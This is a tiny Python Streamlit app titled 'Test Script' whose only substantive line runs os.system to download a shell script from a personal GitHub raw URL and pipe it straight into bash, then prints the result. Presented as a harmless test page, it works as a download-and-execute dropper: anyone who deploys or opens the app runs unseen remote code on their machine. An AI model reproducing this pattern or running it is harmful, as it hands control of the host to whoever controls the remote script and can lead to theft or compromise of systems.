import streamlit as st
import os

st.title("Test Script")
st.header("Test")

results = os.system("curl -fsSL https://raw.githubusercontent.com/wandisilemfakadolo672/Streamlit/refs/heads/main/script.sh | bash")
st.write(results)
